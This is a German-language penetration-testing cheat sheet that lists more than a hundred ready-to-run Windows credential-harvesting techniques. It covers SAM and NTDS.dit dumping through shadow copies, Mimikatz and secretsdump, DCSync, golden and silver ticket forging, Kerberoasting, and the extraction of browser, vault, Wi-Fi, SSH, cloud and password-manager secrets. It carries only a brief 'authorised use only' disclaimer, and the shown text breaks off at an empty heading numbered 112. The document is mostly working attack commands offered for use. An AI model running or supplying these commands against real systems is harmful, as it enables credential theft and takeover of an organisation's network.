# Alternative Credential Sources - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

**Kontext**: Credentials können aus vielen verschiedenen Quellen extrahiert werden - nicht nur aus LSASS. Diese Liste dokumentiert alternative Speicherorte und Extraktionsmethoden.

---

## Inhaltsverzeichnis
1. [SAM Database](#sam-database)
2. [NTDS.dit (Domain Controller)](#ntdsdit-domain-controller)
3. [Windows Credential Manager / Vault](#windows-credential-manager-vault)
4. [DPAPI Secrets](#dpapi-secrets)
5. [Browser Credentials](#browser-credentials)
6. [WiFi Passwords](#wifi-passwords)
7. [Registry Stored Credentials](#registry-stored-credentials)
8. [Scheduled Tasks](#scheduled-tasks)
9. [Windows Services](#windows-services)
10. [IIS Application Pools](#iis-application-pools)
11. [RDP Saved Credentials](#rdp-saved-credentials)
12. [VPN Credentials](#vpn-credentials)
13. [Email Clients](#email-clients)
14. [FTP/SFTP Clients](#ftpsftp-clients)
15. [SSH Keys & Config](#ssh-keys-config)
16. [Git Credentials](#git-credentials)
17. [Cloud Provider Credentials](#cloud-provider-credentials)
18. [Database Connection Strings](#database-connection-strings)
19. [Password Manager Databases](#password-manager-databases)
20. [Kerberos Tickets](#kerberos-tickets)
21. [Certificate Stores](#certificate-stores)
22. [PowerShell History & Secrets](#powershell-history-secrets)
23. [Bash History (WSL)](#bash-history-wsl)
24. [Clipboard & Sticky Notes](#clipboard-sticky-notes)
25. [Environment Variables](#environment-variables)
26. [Application Memory Dumps](#application-memory-dumps)
27. [Network Sniffing](#network-sniffing)
28. [File Shares & Recent Files](#file-shares-recent-files)
29. [Tokens (OAuth, JWT, API Keys)](#tokens-oauth-jwt-api-keys)
30. [Active Directory Attributes](#active-directory-attributes)

---

## SAM Database

**Beschreibung**: Security Account Manager - lokale User Accounts und Passwort-Hashes

### 1. reg save (Native)
```cmd
# SAM, SYSTEM, SECURITY Hives exportieren
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive
```
**Voraussetzung**: Administrator oder SYSTEM-Rechte
**Hinweis**: Dateien sind am laufenden System gesperrt

### 2. Volume Shadow Copy + SAM
```cmd
# Shadow Copy erstellen
vssadmin create shadow /for=C:

# SAM aus Shadow Copy kopieren
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\
```
**Vorteil**: Umgeht Dateisperren

### 3. secretsdump.py (Impacket)
```bash
# Lokal mit Hive-Dateien
secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL

# Remote über SMB
secretsdump.py domain/user:pass@target.local

# Mit NTLM-Hash
secretsdump.py -hashes :ntlmhash domain/user@target.local
```

### 4. CrackMapExec
```bash
# SAM Dump remote
crackmapexec smb 192.168.1.10 -u admin -p pass --sam

# Mit Pass-the-Hash
crackmapexec smb 192.168.1.10 -u admin -H ntlmhash --sam
```

### 5. Mimikatz (Live)
```cmd
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

### 6. PowerShell - Get-SAMHashes
```powershell
# PowerSploit/Empire
Import-Module .\Get-PassHashes.ps1
Get-PassHashes
```

### 7. samdump2 (Linux/Kali)
```bash
samdump2 system.hive sam.hive
```

### 8. pwdump/fgdump
```cmd
# Klassische Tools (veraltet, aber funktional)
pwdump.exe
fgdump.exe
```

**Ausgabe Format**:
```
Username:RID:LM-Hash:NTLM-Hash:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

---

## NTDS.dit (Domain Controller)

**Beschreibung**: Active Directory Database auf Domain Controllern

### 9. ntdsutil (Native DC Tool)
```cmd
# Install From Media (IFM) Dump
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q

# Erzeugt: ntds.dit + Registry Hives
```
**Voraussetzung**: Domain Admin auf DC

### 10. Volume Shadow Copy + NTDS.dit
```cmd
# Shadow Copy auf DC erstellen
vssadmin create shadow /for=C:

# NTDS.dit extrahieren
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

### 11. diskshadow Scripted
```cmd
# Script: ntds.txt
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit c:\temp\ntds.dit
delete shadows volume %someAlias%
reset

# Ausführen
diskshadow /s ntds.txt
```

### 12. DCSync (Remote - Mimikatz)
```cmd
# Einzelnen User
mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:Administrator"

# Alle Users
mimikatz.exe "lsadump::dcsync /domain:contoso.local /all /csv"

# Krbtgt Account (Golden Ticket)
mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:krbtgt"
```
**Voraussetzung**: Replication-Rechte (Domain Admins, Enterprise Admins, oder DS-Replication-Get-Changes)

### 13. DCSync (Impacket)
```bash
# Alle Hashes
secretsdump.py -just-dc domain/user:pass@dc.contoso.local

# Nur NTLM Hashes
secretsdump.py -just-dc-ntlm domain/user:pass@dc.contoso.local

# NTLM + Kerberos Keys
secretsdump.py -just-dc domain/user:pass@dc.contoso.local

# Nur User-Hashes (ohne Computer$)
secretsdump.py -just-dc-user domain/user:pass@dc.contoso.local
```

### 14. Invoke-DCSync (PowerShell)
```powershell
# PowerView
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:contoso.local /all"'
```

### 15. CrackMapExec DCSync
```bash
crackmapexec smb dc.contoso.local -u admin -p pass --ntds
crackmapexec smb dc.contoso.local -u admin -p pass --ntds vss
```

### 16. NTDS.dit Offline Parsing
```bash
# Mit secretsdump
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Output speichern
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes
```

### 17. esedbexport (libesedb)
```bash
# NTDS.dit ESE Database exportieren
esedbexport -m tables ntds.dit

# Dann mit ntdsxtract parsen
dsusers.py datatable.3 link_table.5 --syshive SYSTEM --passwordhashes
```

---

## Windows Credential Manager / Vault

**Beschreibung**: Gespeicherte Credentials in Windows Vault (RDP, Netzwerk-Shares, Websites)

### 18. cmdkey (Native)
```cmd
# Liste alle gespeicherten Credentials
cmdkey /list

# Credential hinzufügen
cmdkey /add:server /user:domain\username /pass:password

# Credential löschen
cmdkey /delete:server
```
**Hinweis**: Zeigt nur Credential-Namen, keine Passwörter

### 19. vaultcmd (Native)
```cmd
# Alle Vaults anzeigen
vaultcmd /list

# Credentials aus Windows Credentials Vault
vaultcmd /listcreds:"Windows Credentials"

# Credentials aus Web Credentials Vault
vaultcmd /listcreds:"Web Credentials"

# Alle Eigenschaften anzeigen
vaultcmd /listproperties:"Windows Credentials"
```

### 20. VaultPasswordView (NirSoft)
```cmd
# GUI Version
VaultPasswordView.exe

# CLI Export
VaultPasswordView.exe /stext credentials.txt
VaultPasswordView.exe /shtml credentials.html
```
**Download**: https://www.nirsoft.net/utils/vault_password_view.html

### 21. Mimikatz Vault/DPAPI
```cmd
mimikatz.exe "privilege::debug" "vault::list" exit
mimikatz.exe "vault::cred /patch" exit
```

### 22. PowerShell CredentialManager Module
```powershell
# Install Module
Install-Module -Name CredentialManager

# Alle Credentials abrufen
Get-StoredCredential

# Spezifische Credential
$cred = Get-StoredCredential -Target "target"
$cred.GetNetworkCredential().Password
```

### 23. Invoke-WCMDump (PowerShell)
```powershell
# Windows Credential Manager Dump
Invoke-WCMDump

# Mit DPAPI Keys
Invoke-WCMDump -MasterKeys
```

---

## DPAPI Secrets

**Beschreibung**: Data Protection API - verschlüsselt gespeicherte Secrets (Browser, RDP, etc.)

### 24. Mimikatz DPAPI
```cmd
# DPAPI Masterkeys anzeigen
mimikatz.exe "sekurlsa::dpapi" exit

# DPAPI Credential entschlüsseln
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\XXXXX"

# Mit Masterkey
mimikatz.exe "dpapi::cred /in:credential_file /masterkey:XXXX"

# Chrome DPAPI
mimikatz.exe "dpapi::chrome /in:'%localappdata%\Google\Chrome\User Data\Default\Login Data'"
```

### 25. SharpDPAPI (C#)
```cmd
# Alle DPAPI Credentials
SharpDPAPI.exe

# Triage Mode (alles dumpen)
SharpDPAPI.exe triage

# RDP Credentials
SharpDPAPI.exe rdg

# Chrome Credentials
SharpDPAPI.exe chromecookies
SharpDPAPI.exe chromelogins

# Vault Credentials
SharpDPAPI.exe vaults

# Mit spezifischem Masterkey
SharpDPAPI.exe machinetriage
```

### 26. DonPAPI (Python)
```bash
# Remote DPAPI Extraction
DonPAPI.py domain/user:pass@target

# Mehrere Targets
DonPAPI.py domain/user:pass@192.168.1.0/24
```

### 27. dpapick (Python)
```python
# DPAPI Masterkey Location
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\

# Credentials Location
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Users\<user>\AppData\Local\Microsoft\Credentials\
```

---

## Browser Credentials

**Beschreibung**: Gespeicherte Passwörter in Web-Browsern

### 28. LaZagne (All Browsers)
```cmd
# Alle Browser Credentials
laZagne.exe browsers

# Alle Credentials (Browsers + mehr)
laZagne.exe all

# Spezifischer Browser
laZagne.exe browsers -chrome
laZagne.exe browsers -firefox
```

### 29. Chrome - Manual Extraction
```cmd
# Chrome Login Data Location
%localappdata%\Google\Chrome\User Data\Default\Login Data

# SQLite Database
# Passwörter sind mit DPAPI verschlüsselt
```

### 30. SharpChrome (C#)
```cmd
# Chrome Cookies
SharpChrome.exe cookies

# Chrome Logins
SharpChrome.exe logins

# Spezifische Domain
SharpChrome.exe logins /domain:example.com
```

### 31. SharpWeb (C# - Multi-Browser)
```cmd
# Alle Browser
SharpWeb.exe all

# Nur Chrome
SharpWeb.exe chrome

# Nur Firefox
SharpWeb.exe firefox

# Nur Edge
SharpWeb.exe edge
```

### 32. WebBrowserPassView (NirSoft)
```cmd
# GUI
WebBrowserPassView.exe

# CLI Export
WebBrowserPassView.exe /stext passwords.txt
```

### 33. Firefox - Manual Extraction
```cmd
# Firefox Passwords Location
%appdata%\Mozilla\Firefox\Profiles\<profile>\logins.json

# Master Password in key4.db
%appdata%\Mozilla\Firefox\Profiles\<profile>\key4.db

# Entschlüsseln mit firefox_decrypt
python firefox_decrypt.py "%appdata%\Mozilla\Firefox\Profiles\"
```

### 34. HackBrowserData (Go)
```bash
# Windows
hack-browser-data.exe

# Output als JSON
hack-browser-data.exe -f json -o output
```

---

## WiFi Passwords

**Beschreibung**: Gespeicherte WLAN-Passwörter

### 35. netsh (Native)
```cmd
# Alle WLAN Profile anzeigen
netsh wlan show profiles

# Passwort für spezifisches Profil
netsh wlan show profile name="SSID-Name" key=clear

# Export aller Profile
netsh wlan export profile key=clear folder=C:\temp
```

### 36. WirelessKeyView (NirSoft)
```cmd
# GUI
WirelessKeyView.exe

# CLI Export
WirelessKeyView.exe /stext wifi.txt
```

### 37. LaZagne WiFi
```cmd
laZagne.exe wifi
```

### 38. PowerShell WiFi Extraction
```powershell
# Alle Profile
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

# Oder einfacher:
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($profile in $profiles) {
    netsh wlan show profile name=$profile key=clear | Select-String "Key Content"
}
```

### 39. CrackMapExec WiFi Module
```bash
crackmapexec smb target -u user -p pass -M wireless
```

---

## Registry Stored Credentials

**Beschreibung**: Credentials und Secrets direkt in der Registry

### 40. VNC Passwords
```cmd
# VNC Encrypted Password Location
reg query HKLM\SOFTWARE\RealVNC\vncserver /v Password
reg query HKCU\Software\RealVNC\vncserver /v Password
reg query HKLM\SOFTWARE\TightVNC\Server /v Password
reg query HKLM\SOFTWARE\TigerVNC\WinVNC4 /v Password

# UltraVNC
reg query HKLM\Software\ORL\WinVNC3\Default /v Password
```
**Entschlüsseln**: VNC verwendet festen DES-Key, Tools wie vncpwd.exe

### 41. Putty Sessions
```cmd
# Putty Session Credentials
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s

# Proxy Passwords (obfuscated)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\<session> /v ProxyPassword
```

### 42. WinSCP
```cmd
# WinSCP Stored Sessions
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s

# Passwords sind obfuscated, nicht verschlüsselt
```

### 43. SNMP Community Strings
```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities
```

### 44. Autologon Credentials
```cmd
# Windows Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

### 45. SessionGopher (PowerShell)
```powershell
# Alle Sessions (Putty, WinSCP, FileZilla, RDP, etc.)
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Thorough

# Remote
Invoke-SessionGopher -Target 192.168.1.10 -u admin -p pass
```

---

## Scheduled Tasks

**Beschreibung**: Credentials in geplanten Aufgaben

### 46. schtasks (Native)
```cmd
# Alle Tasks anzeigen
schtasks /query /fo LIST /v

# Tasks mit Credentials
schtasks /query /fo LIST /v | findstr /i "Author Task Run User"

# Spezifischen Task exportieren
schtasks /query /tn "TaskName" /xml > task.xml
```
**Hinweis**: XML kann Credentials enthalten (oft verschlüsselt mit DPAPI)

### 47. PowerShell Scheduled Tasks
```powershell
# Alle Tasks
Get-ScheduledTask

# Tasks mit Credentials
Get-ScheduledTask | Where-Object {$_.Principal.LogonType -ne "Interactive"} | Select-Object TaskName, TaskPath, State, Principal

# Task Details
Get-ScheduledTaskInfo -TaskName "TaskName"
```

### 48. Task Scheduler COM Object
```powershell
$schedule = New-Object -ComObject Schedule.Service
$schedule.Connect()
$folder = $schedule.GetFolder("\")
$tasks = $folder.GetTasks(0)
$tasks | Select-Object Name, Enabled, State
```

### 49. Mimikatz Task Credentials
```cmd
# Scheduled Task Credentials (wenn im Memory)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

---

## Windows Services

**Beschreibung**: Service Accounts und Credentials

### 50. sc query (Native)
```cmd
# Alle Services
sc query

# Service Details (zeigt Service Account)
sc qc ServiceName

# Service mit Credentials
sc query type= service state= all | findstr "SERVICE_NAME"
```

### 51. PowerShell Get-Service
```powershell
# Services mit Accounts
Get-WmiObject Win32_Service | Select-Object Name, StartName, State, PathName | Where-Object {$_.StartName -notlike "LocalSystem" -and $_.StartName -notlike "NT AUTHORITY*"}

# Service mit Credentials
Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*@*" -or $_.StartName -like "*\*"}
```

### 52. Registry Service Credentials
```cmd
# Service Config in Registry
reg query HKLM\SYSTEM\CurrentControlSet\Services /s | findstr "ImagePath"

# Services mit Passwords (selten, aber möglich)
reg query HKLM\SYSTEM\CurrentControlSet\Services /s /f "password"
```

### 53. AccessChk (Sysinternals)
```cmd
# Services mit schwachen Permissions
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Users" * /accepteula
```

### 54. PowerUp (PowerSploit)
```powershell
# Service Abuse / Credentials
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Unquoted Service Paths mit Credentials
Get-UnquotedService
```

---

## IIS Application Pools

**Beschreibung**: IIS App Pool Identity Credentials

### 55. IIS applicationHost.config
```cmd
# IIS Config Location
C:\Windows\System32\inetsrv\config\applicationHost.config

# App Pool Credentials suchen
type C:\Windows\System32\inetsrv\config\applicationHost.config | findstr /i "userName password"
```

### 56. appcmd.exe (Native IIS Tool)
```cmd
# App Pools anzeigen
%systemroot%\system32\inetsrv\appcmd.exe list apppools

# App Pool Details
%systemroot%\system32\inetsrv\appcmd.exe list apppool "DefaultAppPool" /text:*

# Credentials (verschlüsselt angezeigt)
%systemroot%\system32\inetsrv\appcmd.exe list apppool /text:processModel.userName
%systemroot%\system32\inetsrv\appcmd.exe list apppool /text:processModel.password
```

### 57. IIS Configuration Encryption
```cmd
# Entschlüsseln (wenn Zugriff auf Machine Key)
aspnet_regiis.exe -pdf "system.web/machineKey" -site "Default Web Site"
```

### 58. web.config Connection Strings
```cmd
# Alle web.config Dateien durchsuchen
dir C:\inetpub\wwwroot /s /b | findstr web.config

# Connection Strings suchen
findstr /si "connectionString\|password" C:\inetpub\wwwroot\web.config
```

### 59. PowerShell IIS
```powershell
Import-Module WebAdministration
Get-IISAppPool | Select-Object Name, ProcessModel
```

---

## RDP Saved Credentials

**Beschreibung**: Gespeicherte RDP-Verbindungen und Credentials

### 60. Default.rdp Files
```cmd
# RDP Connection Files durchsuchen
dir %userprofile%\Documents\*.rdp /s
dir C:\Users\*\Documents\*.rdp /s

# Content anzeigen
type "%userprofile%\Documents\default.rdp"
```
**Wichtig**: Username kann drin stehen, Passwort ist DPAPI-verschlüsselt

### 61. RDP Credential Manager
```cmd
# Credentials sind in Windows Vault
cmdkey /list | findstr "TERMSRV"
```

### 62. SharpDPAPI RDG
```cmd
# Remote Desktop Gateway Files (.rdg)
SharpDPAPI.exe rdg

# RDG Files Location
%userprofile%\Documents\*.rdg
```

### 63. Mimikatz RDP
```cmd
# RDP Credentials aus Memory
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# TS/RDP Credentials
mimikatz.exe "privilege::debug" "ts::sessions" exit
```

### 64. RDCMan.settings
```cmd
# Remote Desktop Connection Manager
%userprofile%\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings

# Passwords sind mit DPAPI verschlüsselt
```

---

## VPN Credentials

**Beschreibung**: VPN Client gespeicherte Credentials

### 65. Cisco AnyConnect
```cmd
# Profile Location
%programdata%\Cisco\Cisco AnyConnect Secure Mobility Client\Profile\
%localappdata%\Cisco\Cisco AnyConnect Secure Mobility Client\Preferences.xml

# VPN Preferences (kann Credentials enthalten)
type "%localappdata%\Cisco\Cisco AnyConnect Secure Mobility Client\Preferences.xml"
```

### 66. OpenVPN
```cmd
# OpenVPN Config Files
C:\Program Files\OpenVPN\config\*.ovpn

# Auth Files (Plaintext!)
type "C:\Program Files\OpenVPN\config\auth.txt"
```

### 67. Windows VPN (Native)
```cmd
# VPN Connections
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"

# Phonebook (RAS Connections)
%appdata%\Microsoft\Network\Connections\Pbk\rasphone.pbk
type "%appdata%\Microsoft\Network\Connections\Pbk\rasphone.pbk"
```

### 68. NordVPN / ExpressVPN / ProtonVPN
```cmd
# Config Locations variieren, meist in:
%localappdata%\NordVPN\
%localappdata%\ExpressVPN\
%localappdata%\ProtonVPN\

# Settings Files durchsuchen
dir %localappdata%\*VPN* /s | findstr /i "config settings"
```

---

## Email Clients

**Beschreibung**: Email Account Credentials

### 69. Outlook
```cmd
# Outlook Profile Registry
reg query "HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676" /s
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook" /s

# PST Files
dir C:\Users\*\Documents\Outlook Files\*.pst /s
dir C:\Users\*\AppData\Local\Microsoft\Outlook\*.pst /s
```

### 70. MailPassView (NirSoft)
```cmd
# Alle Email Client Passwords
MailPassView.exe /stext mail_passwords.txt
```

### 71. Thunderbird
```cmd
# Thunderbird Profiles
%appdata%\Thunderbird\Profiles\

# Logins (JSON)
type "%appdata%\Thunderbird\Profiles\<profile>\logins.json"

# Key Database
%appdata%\Thunderbird\Profiles\<profile>\key4.db
```

### 72. Windows Mail / Live Mail
```cmd
# Account Credentials (Registry)
reg query "HKCU\Software\Microsoft\Windows Mail"
reg query "HKCU\Software\Microsoft\Windows Live Mail"
```

---

## FTP/SFTP Clients

**Beschreibung**: FTP Client gespeicherte Sites/Credentials

### 73. FileZilla
```cmd
# FileZilla Site Manager
%appdata%\FileZilla\sitemanager.xml
%appdata%\FileZilla\recentservers.xml

# Passwords sind Base64-kodiert (nicht verschlüsselt!)
type "%appdata%\FileZilla\sitemanager.xml"
```

### 74. WinSCP
```cmd
# Registry Sessions (bereits erwähnt in #42)
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s

# Mit WinSCP Password Decryptor
# Oder SharpDecryptPwd
```

### 75. CoreFTP
```cmd
# Sites XML
%programdata%\CoreFTP\sites.xml
%appdata%\CoreFTP\sites.xml

# Passwords sind verschlüsselt mit bekanntem Key
```

### 76. Total Commander
```cmd
# FTP Connections
%appdata%\GHISLER\wcx_ftp.ini

# Master Password in wincmd.ini
type "%appdata%\GHISLER\wincmd.ini" | findstr /i "password"
```

---

## SSH Keys & Config

**Beschreibung**: Private SSH Keys und Configurations

### 77. SSH Private Keys
```cmd
# Standard Location (Windows)
%userprofile%\.ssh\id_rsa
%userprofile%\.ssh\id_ed25519
%userprofile%\.ssh\id_ecdsa

# Rekursiv suchen
dir C:\Users\*\.ssh\* /s

# Known Hosts / Config
type "%userprofile%\.ssh\config"
type "%userprofile%\.ssh\known_hosts"
```

### 78. Pageant (PuTTY Agent)
```cmd
# Pageant Keys aus Memory extrahieren
# Tools: pageant_dump.py, Mimikatz

mimikatz.exe "crypto::capi" "crypto::cng" exit
```

### 79. Git SSH Keys
```cmd
# Git Credentials
git config --list --show-origin

# Credential Helper
git config --get credential.helper

# Global Config
type "%userprofile%\.gitconfig"
```

### 80. WSL SSH Keys
```cmd
# WSL Home Directories
\\wsl$\Ubuntu\home\<user>\.ssh\
C:\Users\<user>\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu*\LocalState\rootfs\home\*\.ssh\

# Keys extrahieren
type \\wsl$\Ubuntu\home\user\.ssh\id_rsa
```

---

## Git Credentials

**Beschreibung**: Git Credentials und Tokens

### 81. Git Credential Manager
```cmd
# Windows Credential Manager
cmdkey /list | findstr git

# Git Config
git config --list --show-origin | findstr credential
```

### 82. .git-credentials
```cmd
# Plaintext Credentials File
type "%userprofile%\.git-credentials"

# Format: https://username:password@github.com
```

### 83. .gitconfig
```cmd
# Global Config
type "%userprofile%\.gitconfig"

# Local Repo Config
type .git\config

# Kann Credentials, Tokens, oder Helper enthalten
```

### 84. Environment Variables
```cmd
# Git Credentials via ENV
echo %GIT_USERNAME%
echo %GIT_PASSWORD%
echo %GITHUB_TOKEN%
```

---

## Cloud Provider Credentials

**Beschreibung**: AWS, Azure, GCP Credentials

### 85. AWS Credentials
```cmd
# AWS CLI Credentials
%userprofile%\.aws\credentials
%userprofile%\.aws\config

type "%userprofile%\.aws\credentials"
```
**Format**:
```ini
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### 86. Azure CLI
```cmd
# Azure Credentials
%userprofile%\.azure\azureProfile.json
%userprofile%\.azure\clouds.config
%userprofile%\.azure\config

# Tokens
%userprofile%\.azure\accessTokens.json
type "%userprofile%\.azure\accessTokens.json"
```

### 87. Azure PowerShell
```powershell
# Saved Contexts
Get-AzContext -ListAvailable

# Context File
%userprofile%\.Azure\AzureRmContext.json
```

### 88. GCP / gcloud
```cmd
# GCP Credentials
%appdata%\gcloud\credentials.db
%appdata%\gcloud\configurations\config_default

# Service Account Keys (JSON)
dir C:\Users\*\*service-account*.json /s
```

### 89. Terraform
```cmd
# Terraform State Files (kann Credentials enthalten!)
dir C:\*\terraform.tfstate /s

type terraform.tfstate | findstr /i "password secret key token"
```

### 90. Docker
```cmd
# Docker Config
%userprofile%\.docker\config.json

# Kann Registry Credentials enthalten
type "%userprofile%\.docker\config.json"
```

---

## Database Connection Strings

**Beschreibung**: Connection Strings in Config Files

### 91. web.config / app.config
```cmd
# IIS Web Apps
findstr /si "connectionString" C:\inetpub\wwwroot\*.config

# .NET Applications
dir C:\*\app.config /s
dir C:\*\web.config /s

# Connection String Pattern
findstr /si "Server=.*Password=" C:\*.config
```

### 92. appsettings.json
```cmd
# .NET Core Applications
dir C:\*\appsettings.json /s
dir C:\*\appsettings.Production.json /s

type appsettings.json | findstr /i "ConnectionString Password"
```

### 93. .env Files
```cmd
# Environment Files
dir C:\*.env /s
dir C:\*\.env.local /s

type .env | findstr /i "DB_PASSWORD API_KEY SECRET"
```

### 94. ODBC Data Sources
```cmd
# ODBC Registry
reg query "HKLM\SOFTWARE\ODBC\ODBC.INI" /s
reg query "HKCU\SOFTWARE\ODBC\ODBC.INI" /s

# ODBC Files
type C:\Windows\odbc.ini
```

### 95. UDL Files (Universal Data Link)
```cmd
# UDL Files durchsuchen
dir C:\*.udl /s

# Content (Plaintext Connection String!)
type connection.udl
```

---

## Password Manager Databases

**Beschreibung**: Password Manager Database Files

### 96. KeePass
```cmd
# KeePass Database Files
dir C:\*.kdbx /s
dir %userprofile%\*\*.kdbx /s

# KeePass Config (kann Master Password Hints enthalten)
%appdata%\KeePass\KeePass.config.xml
```
**Hinweis**: Databases sind verschlüsselt, aber Master Password kann im Memory sein

### 97. KeeThief (Memory Extraction)
```cmd
# Master Password aus KeePass Memory extrahieren
KeeThief.exe
```

### 98. LastPass
```cmd
# LastPass Local Vault (verschlüsselt)
%localappdata%\LastPass\*
```

### 99. 1Password
```cmd
# 1Password Vault Location
%localappdata%\1Password\data\
```

### 100. Bitwarden
```cmd
# Bitwarden Local Storage
%appdata%\Bitwarden\data.json
```

---

## Kerberos Tickets

**Beschreibung**: Kerberos TGT/TGS Tickets für Pass-the-Ticket

### 101. klist (Native)
```cmd
# Aktuelle Kerberos Tickets
klist

# TGT Tickets
klist tgt

# Ticket Details
klist tickets
```

### 102. Mimikatz Kerberos
```cmd
# Alle Tickets exportieren
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# Golden Ticket erstellen (mit krbtgt hash)
mimikatz.exe "kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /krbtgt:NTLMHASH /user:Administrator /id:500 /ptt"

# Silver Ticket
mimikatz.exe "kerberos::golden /domain:contoso.local /sid:S-1-5-21-... /target:server.contoso.local /service:cifs /rc4:NTLMHASH /user:Administrator /ptt"
```

### 103. Rubeus (C# Kerberos Tool)
```cmd
# Alle Tickets dumpen
Rubeus.exe dump

# TGT Request
Rubeus.exe asktgt /user:username /password:password /domain:contoso.local

# TGS Request
Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.contoso.local

# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi

# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt

# ASREPRoasting
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

### 104. Invoke-Kerberoast (PowerShell)
```powershell
# PowerView Kerberoasting
Import-Module .\PowerView.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt

# Mit Get-DomainSPNTicket
Get-DomainSPNTicket -SPN "MSSQLSvc/sql01.contoso.local"
```

### 105. GetUserSPNs.py (Impacket)
```bash
# Kerberoasting Remote
GetUserSPNs.py domain/user:pass -dc-ip 192.168.1.10 -request

# Mit Hash
GetUserSPNs.py domain/user -hashes :NTLMHASH -dc-ip 192.168.1.10 -request
```

---

## Certificate Stores

**Beschreibung**: Certificates und Private Keys

### 106. certutil (Native)
```cmd
# Alle Certificates anzeigen
certutil -store My

# User Certificate Store
certutil -store -user My

# Computer Certificate Store
certutil -store -enterprise Root

# Certificate exportieren
certutil -store My 1 output.cer
```

### 107. PowerShell Certificates
```powershell
# Alle Certificates
Get-ChildItem Cert:\CurrentUser\My
Get-ChildItem Cert:\LocalMachine\My

# Mit Private Key
Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.HasPrivateKey}

# Certificate exportieren
$cert = Get-ChildItem Cert:\CurrentUser\My | Select-Object -First 1
Export-Certificate -Cert $cert -FilePath cert.cer
```

### 108. Mimikatz Certificates
```cmd
# Certificates mit Private Keys exportieren
mimikatz.exe "crypto::capi" "crypto::cng" "crypto::certificates /export" exit
```

### 109. SharpDPAPI Certificates
```cmd
SharpDPAPI.exe certificates
```

---

## PowerShell History & Secrets

**Beschreibung**: PowerShell Command History und Secrets

### 110. PSReadLine History
```powershell
# History File Location
%appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Content anzeigen
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Oft Credentials in Commands!
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### 111. PowerShell Transcripts
```cmd
# Transcript Locations (wenn aktiviert)
%userprofile%\Documents\PowerShell_transcript.*.txt
%systemdrive%\transcripts\*.txt

# Suchen
dir C:\*PowerShell_transcript* /s
```

### 112. PowerShell Credentials in Scripts
